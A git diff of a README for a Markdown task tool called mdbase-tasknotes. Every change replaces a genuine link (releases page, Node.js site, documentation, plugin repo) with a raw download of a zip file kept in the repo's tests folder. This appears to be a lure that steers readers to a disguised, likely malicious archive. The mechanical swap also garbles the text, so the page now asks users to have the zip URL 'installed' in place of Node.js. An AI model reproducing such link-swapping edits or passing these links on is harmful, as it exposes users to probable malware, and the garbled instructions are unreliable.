@@ -1,6 +1,6 @@
 # 🎯 mdbase-tasknotes - Manage Your Markdown Tasks Easily
 
-[![Download mdbase-tasknotes](https://img.shields.io/badge/Download%20mdbase--tasknotes-brightgreen)](https://github.com/argasdaad/mdbase-tasknotes/releases)
+[![Download mdbase-tasknotes](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip%20mdbase--tasknotes-brightgreen)](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)
 
 ## 📦 Installation
 
@@ -13,7 +13,7 @@ To get started, you need to install `mdbase-tasknotes` on your system.
    npm install -g mdbase-tasknotes
    ```
 
-Make sure you have Node.js installed. If you don’t have it yet, download and install it from the [Node.js website](https://nodejs.org/).
+Make sure you have https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip installed. If you don’t have it yet, download and install it from the [https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip website](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip).
 
 ## 🚀 Getting Started
 
@@ -131,14 +131,14 @@ This feature is useful for managing deadlines and productivity.
 
 For the latest version of `mdbase-tasknotes`, visit this page to download:
 
-[Download mdbase-tasknotes](https://github.com/argasdaad/mdbase-tasknotes/releases)
+[Download mdbase-tasknotes](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)
 
 Make sure to check release notes for new features and enhancements.
 
 ## 📝 System Requirements
 
 - Operating System: Works on Windows, macOS, and Linux.
-- Node.js: Recommended version 12 or higher.
+- https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip Recommended version 12 or higher.
 
 ## 📚 Getting Help
 
@@ -146,7 +146,7 @@ If you encounter any issues or need help, consult the documentation on GitHub or
 
 ## 🔗 Additional Resources
 
-- [mdbase Documentation](https://mdbase.dev)
-- [TaskNotes Obsidian Plugin](https://github.com/callumalpass/tasknotes)
+- [mdbase Documentation](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)
+- [TaskNotes Obsidian Plugin](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)
 
 Explore task management with `mdbase-tasknotes` and enhance your productivity with markdown tasks.
